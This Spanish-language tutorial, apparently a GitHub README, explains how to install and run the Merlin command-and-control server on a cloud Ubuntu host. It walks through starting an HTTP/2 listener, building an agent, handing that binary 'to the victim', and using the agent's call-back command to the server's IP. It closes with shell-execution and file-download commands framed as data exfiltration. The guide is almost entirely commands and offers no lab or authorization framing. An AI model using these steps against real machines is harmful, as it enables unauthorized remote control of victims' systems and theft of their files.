# Instalación de C2 - Merlin

![N|Solid](https://merlin-c2.readthedocs.io/en/latest/_images/merlin-horizontal.png)


Merlin es una herramienta de Comando y Control (C2) creada en Go, soporta los protocolos de comunicación HTTP/1.1,HTTP/2 y HTTP/3, y permite crear agentes para Windows, Linux y MacOS.

![image](https://user-images.githubusercontent.com/50930193/179371066-f55ef72e-e31c-43b1-ba7a-e12078d5101b.png)

Los siguientes comandos han sido validados en Ubuntu; de utilizarse alguna otra distribución, se deberán buscar los comandos equivalentes.

## Instalación de prerequisitos 
<br/>

Tener instalado en nube un server en Ubuntu, para este ejercicio voy a crear un servidor en Digital Ocean

![image](https://user-images.githubusercontent.com/50930193/179369081-0984e9c6-ecf0-4ae6-8747-31d166a5fba6.png)

```
apt install p7zip-full
apt install git
apt install make
```
<br/><br/>

## Descarga del servidor C2
<br/>

```
cd /opt #Ir a la ruta /opt
```
```
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z #Descargar última versión disponible del servidor para sistemas Linux
```
![image](https://user-images.githubusercontent.com/50930193/179369119-54853407-f160-4f60-b5e7-744460968622.png)

```
7z x -pmerlin -omerlin merlinServer-Linux-x64.7z #Descomprimir el archivo descargado
```
![image](https://user-images.githubusercontent.com/50930193/179369130-8ec67795-9fd5-40c4-a999-cb5e0409e80d.png)

<br/><br/>

## Configuración e inicio del servidor
<br/>

```
cd /opt/merlin #Acceder a la ruta donde se descargó el servidor C2
```
```
./merlinServer-Linux-x64 #Iniciar el servidor
```
![image](https://user-images.githubusercontent.com/50930193/179369733-5a5b2553-c687-406a-8d16-c7478bac4b9b.png)

```
listeners #Acceder al menú de listeners
```
```
use http2 #Indicar al servidor que se desea utilizar HTTP/2 para comunicarse con el agente; de utilizarse otro protocolo, se deberá especificar al momento de crear el agente
```
```
set Interface 0.0.0.0 #Indicar al servidor que se esperan conexiones desde cualquiera de sus interfaces de red
```
```
set PSK CLAVESECRETA #Indicar al servidor que se deberá utilizar la clave CLAVESECRETA para la comunicación con el agente; esta clave deberá ser la misma que se use al momento de emplear el agente
```
```
start #Inicia el servicio y espera conexiones
```
![image](https://user-images.githubusercontent.com/50930193/179369811-70b549a6-d97a-43d2-b20f-b559ddaf6099.png)

<br/><br/>

## Creación de agente
<br/>
<br/><br/>
**Se deberá compartir el binario (agente) a la víctima** La manera mas sencilla de disponer del agente es emplear los archivos binarios precompilados del Agente Merlin los cuales se distribuyen con la descarga del servidor en el directorio **data/bin/** de Merlin

La otra opción es en el agente descargar  e instalar el agente empleando estos pasos:

```
cd /opt #Ir a la ruta /opt
```
```
git clone https://github.com/Ne0nd0g/merlin-agent.git #Descargar el código necesario para crear agentes
```
![image](https://user-images.githubusercontent.com/50930193/179369460-ba258a57-b8bf-43d9-b487-7f13142e444b.png)

```
cd merlin-agent #Acceder al directorio descargado
```
```
make linux #Crear el binario para Linux, de estar creando el agente para otro sistema operativo, reemplazar "linux" por "darwin" (MacOS) o "Windows". El binario se creará en la carpeta bin
```

![image](https://user-images.githubusercontent.com/50930193/179369181-c7583bfe-dd74-4fa3-8b9f-1575033ae408.png)

![image](https://user-images.githubusercontent.com/50930193/179369193-42cc3870-30de-4622-bed8-c9d944f3188d.png)

Ahora se deberá usar el agente para establecer un canal de comunicación con el servidor

```
./merlinAgent-Linux-x64 -url https://DIRECCION_IP:443 -psk CLAVESECRETA #se deberá cambiar la dirección IP del servidor de C2 e introducir una clave secreta para la comunicación entre el agente y el servidor C2
```
El resultado da cuenta de un nuevo de la creación de un GUID (Identificador del agente)

![image](https://user-images.githubusercontent.com/50930193/179370142-ffa81873-12b7-45ed-949b-0dac0d81fd59.png)



## Interacción con los agentes
<br/>

```
sessions #Lista las conexiones activas, anotar el identificador del agente (víctima) con el que se desea interactuar
``` 
```
interact AGENTE #Inicia interacción con el agente
```
```
info #Muestra información sobre el sistema operativo sobre el que se está ejecutando el agente (víctima)
```
![image](https://user-images.githubusercontent.com/50930193/179370248-ad9195be-5c69-48ea-aa6c-c52170b6ae68.png)
```
help #Lista las opciones disponibles
```
![image](https://user-images.githubusercontent.com/50930193/179370294-09ce4e0e-c81a-4105-8066-a7b0ef5f2c9f.png)

```
shell COMANDO #Ejecuta un comando en la víctima
```
![image](https://user-images.githubusercontent.com/50930193/179370369-1107d168-c749-4783-ac2f-e095d8bec078.png)

Ahora supongamos que queremos ubicar información a exfiltrar puede usar los comando siguientes
```
cd CARPETA
shell ls
download FILE
```
![image](https://user-images.githubusercontent.com/50930193/179370624-b5379c7b-f553-40aa-a1c5-42bdebec1e79.png)
